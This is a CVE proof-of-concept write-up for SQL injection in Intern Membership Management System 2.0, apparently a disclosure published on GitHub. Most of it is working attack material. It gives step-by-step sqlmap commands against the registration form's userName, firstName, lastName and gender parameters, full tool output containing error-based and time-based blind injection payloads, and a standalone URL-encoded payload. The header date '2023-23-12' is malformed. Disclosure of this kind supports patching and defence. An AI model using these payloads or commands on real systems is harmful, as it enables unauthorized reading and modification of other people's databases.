# CVE-2023-7131_Intern_Membership_Management_System-SQL-Injection
+ **Exploit Title:** CVE-2023-7131_Intern_Membership_Management_System-SQL-Injection
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/intern-membership-management-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/INTERN_MEMBERSHIP_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 2.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.5, Apache 2.4.53
+ **CVE:** CVE-2023-7131

## References: 
+ **CVE-2023-7131:** https://vuldb.com/?id.249134
+ https://www.cve.org/CVERecord?id=CVE-2023-7131

## Description:
Intern Membership Management System 2.0 allows SQL Injection via parameters 'userName', 'firstName', 'lastName', and 'gender' in "/intern/user_registration/". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the user registration page: "http://localhost/intern/user_registration/"
+ Fill the form and click 'Register' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Use sqlmap to exploit. In sqlmap, use 'userName', 'firstName', 'lastName', and 'gender' parameters to dump the database. 
+ `python sqlmap.py -r r.txt -p userName --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db`
```
[23:08:01] [INFO] parsing HTTP request from 'r.txt'
[23:08:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: userName (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: userName=test'||(SELECT 0x41516658 WHERE 5902=5902 AND (SELECT 6279 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(6279=6279,1))),0x7171786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&firstName=test&lastName=test&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male&terms=on&register-user=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: userName=test'||(SELECT 0x4b4f7742 WHERE 6652=6652 AND (SELECT 1818 FROM (SELECT(SLEEP(5)))EDSH))||'&firstName=test&lastName=test&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male&terms=on&register-user=Register
---
[23:08:03] [INFO] testing MySQL
[23:08:03] [INFO] confirming MySQL
[23:08:03] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.5, Apache 2.4.53
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[23:08:03] [INFO] fetching current database
[23:08:03] [INFO] resumed: 'db_issm'
current database: 'db_issm'
```

+ `python sqlmap.py -r r.txt -p firstName --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db`
```
[23:10:30] [INFO] parsing HTTP request from 'r.txt'
[23:10:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: firstName (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: userName=test&firstName=test'||(SELECT 0x72666763 WHERE 6198=6198 AND (SELECT 3585 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(3585=3585,1))),0x7171786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&lastName=test&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male&terms=on&register-user=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: userName=test&firstName=test'||(SELECT 0x4c58726c WHERE 5649=5649 AND (SELECT 7272 FROM (SELECT(SLEEP(5)))edvW))||'&lastName=test&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male&terms=on&register-user=Register
---
[23:10:32] [INFO] testing MySQL
[23:10:33] [INFO] confirming MySQL
[23:10:33] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53, PHP 8.1.5
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[23:10:33] [INFO] fetching current database
[23:10:33] [INFO] resumed: 'db_issm'
current database: 'db_issm'
```

+ `python sqlmap.py -r r.txt -p lastName --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db`
```
---
Parameter: lastName (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: userName=test&firstName=test&lastName=test'||(SELECT 0x75425548 WHERE 3456=3456 AND (SELECT 4050 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(4050=4050,1))),0x7171786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male&terms=on&register-user=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: userName=test&firstName=test&lastName=test'||(SELECT 0x49745477 WHERE 1875=1875 AND (SELECT 8777 FROM (SELECT(SLEEP(5)))cVgI))||'&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male&terms=on&register-user=Register
---
[23:13:41] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53, PHP 8.1.5
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:13:41] [INFO] fetching current database
[23:13:41] [INFO] resumed: 'db_issm'
current database: 'db_issm'
```

+ `python sqlmap.py -r r.txt -p gender --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db`
```
---
Parameter: gender (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: userName=test&firstName=test&lastName=test&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male'||(SELECT 0x73574b73 WHERE 9608=9608 AND (SELECT 9046 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(9046=9046,1))),0x7171786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&terms=on&register-user=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: userName=test&firstName=test&lastName=test&password=P@ss123&confirm_password=P@ss123&userEmail=test@mail.com&gender=Male'||(SELECT 0x67657950 WHERE 3206=3206 AND (SELECT 2290 FROM (SELECT(SLEEP(5)))OKGZ))||'&terms=on&register-user=Register
---
[23:17:12] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.5, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:17:12] [INFO] fetching current database
[23:17:12] [INFO] resumed: 'db_issm'
current database: 'db_issm'
```

+ current database: `db_issm`
![1_sqlmap](https://github.com/h4md153v63n/CVEs/assets/5091265/ab492034-196a-4f84-b0d0-3fbbbc25ae87)

+ Example payload:
```
-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27
```
![1_burp](https://github.com/h4md153v63n/CVEs/assets/5091265/910b1684-ab8a-4da2-874f-ff75c38eb727)
